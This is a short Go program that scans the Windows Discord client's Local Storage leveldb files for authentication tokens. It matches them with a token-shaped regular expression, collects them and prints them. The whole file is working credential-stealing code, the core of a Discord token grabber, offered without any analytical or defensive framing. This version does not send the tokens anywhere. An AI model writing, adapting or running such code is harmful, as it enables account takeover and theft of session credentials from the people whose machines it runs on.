package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
)

var Tokens []string

func GrabDiscord() {
	files, err := ioutil.ReadDir(os.Getenv("USERPROFILE") + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb")
	if err != nil {
		fmt.Println(err)
	}
	for file := range files {
		r, err := regexp.Compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
		if err != nil {
			fmt.Println(err)
		}
		f, err := ioutil.ReadFile(os.Getenv("USERPROFILE") + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\" + files[file].Name())
		if err != nil {
			fmt.Println(err)
		}
		Tokens = append(Tokens, string(r.Find(f)))
	}
}

func main() {
	GrabDiscord()
	fmt.Println(Tokens)
}
